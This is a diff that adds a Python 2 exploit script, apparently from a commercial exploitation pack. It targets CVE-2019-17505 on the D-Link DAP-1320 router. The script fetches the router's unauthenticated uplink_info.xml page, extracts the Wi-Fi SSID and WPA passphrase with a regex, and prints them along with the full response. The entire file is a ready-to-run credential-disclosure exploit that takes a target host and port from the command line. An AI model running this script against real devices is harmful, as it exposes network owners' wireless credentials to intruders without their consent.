@@ -1,0 +1,44 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2019
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import requests
+
+_name_   = 'd2sec_dlink_32'
+_vendor_ = 'dlink'
+_model_  = ['DAP-1320']
+_vuln_   = 'Credentials Disclosure Vulnerability'
+_cve_    = 'CVE-2019-17505'
+_ref_    = 'https://github.com/dahua966/Routers-vuls/blob/master/DAP-1320/vuls_poc.md'
+_port_   = 80
+
+def pwnrouter(host,port=_port_):
+  try:
+    url = "http://%s:%s/uplink_info.xml" % (host,port)
+    response = requests.get(url, verify=False)
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  if response is None:
+    print '[+] %s not vulnerable' % host
+  if "wlan1_security" in response.text:
+    print '[+] %s vulnerable' % host
+    m = re.search("<wlan1_ssid>([^<]+)</wlan1_ssid>[\\s\\S]+<wlan1_psk_pass_phrase>([^<]+)</wlan1_psk_pass_phrase>", response.text)
+    if m:
+        print('SSID: %s\nPASSPHRASE: %s\n\n===\n\n'%(m.group(1),m.group(2)))
+        print response.text           
+  else:
+    print '[+] %s not vulnerable' % host
+
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1], int(sys.argv[2]))
